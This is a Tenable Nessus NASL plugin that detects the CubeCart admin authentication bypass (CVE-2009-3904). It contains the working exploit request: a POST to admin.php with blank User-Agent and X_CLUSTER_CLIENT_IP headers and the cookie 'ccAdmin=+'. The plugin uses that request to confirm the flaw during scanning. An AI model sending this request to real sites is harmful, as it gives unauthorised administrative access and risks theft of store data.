#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(42353);
  script_version("1.16");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2009-3904");
  script_bugtraq_id(36882);

  script_name(english:"CubeCart Admin Authentication Bypass");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has an authentication
bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of CubeCart running on the remote host has an
authentication bypass vulnerability.  Sending a specially crafted
POST request for 'admin.php' bypasses authentication for the
administrative user.  A remote attacker could exploit this to perform
administrative actions such as installing malicious packages or
dumping the CubeCart database.");
  # https://www.acunetix.com/blog/news/cubecart-4-session-management-bypass-leads-to-administrator-access/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b7755305");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2009/Oct/302");
  # https://forums.cubecart.com/topic/39748-cubecart-435-session-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d6571752");
  script_set_attribute(attribute:"solution", value:
"Upgrade to CubeCart 4.3.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/10/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cubecart:cubecart");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("cubecart_detect.nasl");
  script_require_keys("www/cubecart");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'cubecart', port:port);
if (isnull(install)) exit(1, "CubeCart wasn't detected on port " + port);

headers = make_array(
  'User-Agent', '',
  'X_CLUSTER_CLIENT_IP', '',
  'Cookie', 'ccAdmin=+'
);
url = string(install['dir'], '/admin.php');
req = http_mk_post_req(
  port:port,
  item:url,
  add_headers:headers
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if ('<span class="txtLogin">Logged in as: <strong>' >< res[2])
{
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report = string(
      "\n",
      "Nessus bypassed authentication by issuing the following request :\n",
      "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
      req_str, "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, "The CubeCart install at "+build_url(port:port, qs:install['dir']+"/")+" is not affected.");
